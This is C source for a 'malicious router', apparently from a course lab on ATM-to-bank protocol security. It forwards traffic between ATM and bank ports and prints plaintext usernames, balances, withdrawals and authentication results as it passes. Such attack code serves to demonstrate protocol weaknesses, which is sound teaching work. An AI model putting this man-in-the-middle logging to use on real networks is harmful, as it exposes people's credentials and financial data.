/* malicious router for team 6825f15e: forwards, logs plaintext */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "router.h"
#include "ports.h"

#define MAX_PKT 1000

/* last username seen */
static char last_user[256] = "(unknown)";

/* null terminated copy for strtok */
static void snapshot(const char *src, ssize_t n, char *dst, size_t dst_sz) {
    if (n < 0) {
        n = 0;
    }
    if ((size_t) n >= dst_sz) {
        n = dst_sz - 1;
    }
    memcpy(dst, src, (size_t) n);
    dst[n] = '\0';
}

/* log atm -> bank leaks */
static void inspect_atm_to_bank(const char *pkt, ssize_t n) {
    char buf[MAX_PKT + 1];
    snapshot(pkt, n, buf, sizeof(buf));

    char *cmd  = strtok(buf,  " \t\r\n");
    char *arg1 = strtok(NULL, " \t\r\n");
    char *arg2 = strtok(NULL, " \t\r\n");

    if (cmd == NULL) {
        return;
    }

    if (strcmp(cmd, "EXISTS") == 0 || strcmp(cmd, "AUTH") == 0) {
        if (arg1 != NULL) {
            strncpy(last_user, arg1, sizeof(last_user) - 1);
            last_user[sizeof(last_user) - 1] = '\0';
            printf("ATM->bank %s for user '%s'\n", cmd, last_user);
        }
    }
    else if (strcmp(cmd, "WITHDRAW") == 0 && arg1 != NULL && arg2 != NULL) {
        printf("ATM->bank WITHDRAW (user '%s') wants $%s\n",
               last_user, arg1);
    }
    else if (strcmp(cmd, "BALANCE") == 0) {
        printf("ATM->bank BALANCE  (user '%s') request\n", last_user);
    }
    else if (strcmp(cmd, "END") == 0) {
        printf("ATM->bank END      (user '%s')\n", last_user);
    }
    fflush(stdout);
}

/* log bank -> atm leaks */
static void inspect_bank_to_atm(const char *pkt, ssize_t n) {
    char buf[MAX_PKT + 1];
    snapshot(pkt, n, buf, sizeof(buf));

    char *cmd  = strtok(buf,  " \t\r\n");
    char *arg1 = strtok(NULL, " \t\r\n");
    char *arg2 = strtok(NULL, " \t\r\n");

    if (cmd == NULL) {
        return;
    }

    if (strcmp(cmd, "BALANCE") == 0 && arg1 != NULL && arg2 != NULL) {
        printf("LEAK <-- balance of '%s' = $%s\n", last_user, arg1);
    }
    else if (strcmp(cmd, "DISPENSE") == 0 && arg1 != NULL && arg2 != NULL) {
        printf("LEAK <-- dispensed $%s to '%s'\n", arg1, last_user);
    }
    else if (strcmp(cmd, "INSUFFICIENT") == 0) {
        printf("LEAK <-- '%s' had insufficient funds for last withdraw\n",
               last_user);
    }
    else if (strcmp(cmd, "AUTH_OK") == 0) {
        printf("bank->ATM AUTH_OK  (user '%s' is now logged in)\n", last_user);
    }
    else if (strcmp(cmd, "AUTH_FAIL") == 0) {
        printf("bank->ATM AUTH_FAIL (user '%s')\n", last_user);
    }
    else if (strcmp(cmd, "EXISTS_OK") == 0 || strcmp(cmd, "EXISTS_NO") == 0) {
        printf("bank->ATM %s for user '%s'\n", cmd, last_user);
    }
    fflush(stdout);
}

/* forward and log */
int main(int argc, char **argv) {
    (void) argc;
    (void) argv;

    int n;
    char mesg[MAX_PKT];
    struct sockaddr_in incoming_addr;

    Router *router = router_create();

    printf("malicious router started -- passively leaking plaintext payloads\n");
    fflush(stdout);

    while (1) {
        n = router_recv(router, mesg, MAX_PKT, &incoming_addr);
        if (n <= 0) {
            continue;
        }

        unsigned short incoming_port = ntohs(incoming_addr.sin_port);

        if (incoming_port == ATM_PORT) {
            inspect_atm_to_bank(mesg, n);
            router_sendto_bank(router, mesg, n);
        }
        else if (incoming_port == BANK_PORT) {
            inspect_bank_to_atm(mesg, n);
            router_sendto_atm(router, mesg, n);
        }
        else {
            fprintf(stderr, "> I don't know who this came from: dropping it\n");
        }
    }

    return EXIT_SUCCESS;
}
